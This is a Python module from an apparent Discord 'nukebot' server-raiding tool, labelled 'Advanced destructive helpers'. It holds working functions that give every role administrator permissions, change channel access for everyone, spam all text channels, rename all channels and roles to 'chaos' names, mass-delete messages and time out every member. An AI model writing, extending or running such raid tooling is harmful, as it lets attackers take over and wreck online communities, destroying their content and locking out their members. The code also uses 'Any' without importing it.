"""Advanced destructive helpers."""

from __future__ import annotations

import random

import discord

from nukebot.core.templates import render_template
from nukebot.features.common import Context, Result


async def channel_permission_nuke(ctx: Context, channels: list[Any], allow: bool) -> Result:
    result = Result(action="channel_permission_nuke")
    if ctx.dry_run.enabled:
        ctx.dry_run.record("channel_permission_nuke", "channel", len(channels))
        result.success = len(channels)
        return result
    for channel in channels:
        try:
            overwrite = channel.overwrites_for(ctx.guild.default_role)
            overwrite.view_channel = allow
            overwrite.send_messages = allow
            overwrite.connect = allow
            overwrite.speak = allow
            await ctx.rate_limiter.run(
                lambda channel=channel, overwrite=overwrite: channel.set_permissions(
                    ctx.guild.default_role, overwrite=overwrite
                ),
                "channel_permission_nuke",
            )
            result.success += 1
        except Exception as exc:  # noqa: BLE001
            result.add_error(f"perm {channel.id}: {exc}")
    return result


async def role_permission_nuke_all(ctx: Context, roles: list[discord.Role], administrator: bool = True) -> Result:
    result = Result(action="role_permission_nuke_all")
    if ctx.dry_run.enabled:
        ctx.dry_run.record("role_permission_nuke_all", "role", len(roles))
        result.success = len(roles)
        return result
    permissions = discord.Permissions.all() if administrator else discord.Permissions.none()
    for role in roles:
        try:
            await ctx.rate_limiter.run(lambda role=role: role.edit(permissions=permissions), "role_perm_nuke")
            result.success += 1
        except Exception as exc:  # noqa: BLE001
            result.add_error(f"role perm {role.id}: {exc}")
    return result


async def spam_all_channels(ctx: Context, content: str, count: int, delay: float = 0.2) -> Result:
    result = Result(action="spam_all_channels")
    channels = list(ctx.guild.text_channels)
    if ctx.dry_run.enabled:
        ctx.dry_run.record("spam_all_channels", "channel", len(channels) * count)
        result.success = len(channels) * count
        return result
    for channel in channels:
        for i in range(count):
            text = render_template(content, i + 1, {"guild": ctx.guild.name, "channel": channel.name})
            try:
                await ctx.rate_limiter.run(lambda channel=channel, text=text: channel.send(text), "spam_all")
                result.success += 1
            except Exception as exc:  # noqa: BLE001
                result.add_error(f"spam {channel.id}: {exc}")
            if delay:
                import asyncio

                await asyncio.sleep(delay)
    return result


async def chaos_rename(ctx: Context) -> Result:
    result = Result(action="chaos_rename")
    channels = list(ctx.guild.channels)
    roles = [r for r in ctx.guild.roles if r.name != "@everyone"]
    if ctx.dry_run.enabled:
        ctx.dry_run.record("chaos_rename", "object", len(channels) + len(roles))
        result.success = len(channels) + len(roles)
        return result
    for index, channel in enumerate(channels, start=1):
        name = render_template("chaos-{random}", index, {"guild": ctx.guild.name})
        try:
            await ctx.rate_limiter.run(lambda channel=channel, name=name: channel.edit(name=name), "chaos_channel")
            result.success += 1
        except Exception as exc:  # noqa: BLE001
            result.add_error(f"chaos channel {channel.id}: {exc}")
    for role in roles:
        name = render_template("chaos-{random}", role.id, {"guild": ctx.guild.name})
        try:
            await ctx.rate_limiter.run(lambda role=role, name=name: role.edit(name=name), "chaos_role")
            result.success += 1
        except Exception as exc:  # noqa: BLE001
            result.add_error(f"chaos role {role.id}: {exc}")
    return result


async def purge_all_channels(ctx: Context, limit: int = 1000) -> Result:
    result = Result(action="purge_all_channels")
    channels = list(ctx.guild.text_channels)
    if ctx.dry_run.enabled:
        ctx.dry_run.record("purge_all_channels", "channel", len(channels))
        result.success = len(channels)
        return result
    for channel in channels:
        try:
            purged = await ctx.rate_limiter.run(lambda channel=channel: channel.purge(limit=limit), "purge_all")
            result.success += len(purged) if purged else 0
        except Exception as exc:  # noqa: BLE001
            result.add_error(f"purge {channel.id}: {exc}")
    return result


async def mass_timeout_all(ctx: Context, seconds: int) -> Result:
    result = Result(action="mass_timeout_all")
    members = [m for m in ctx.guild.members if not m.bot]
    if ctx.dry_run.enabled:
        ctx.dry_run.record("mass_timeout_all", "member", len(members))
        result.success = len(members)
        return result
    from datetime import datetime, timedelta, timezone

    until = datetime.now(timezone.utc) + timedelta(seconds=seconds)
    for member in members:
        try:
            await ctx.rate_limiter.run(lambda member=member: member.timeout(until), "timeout_all")
            result.success += 1
        except Exception as exc:  # noqa: BLE001
            result.add_error(f"timeout {member.id}: {exc}")
    return result
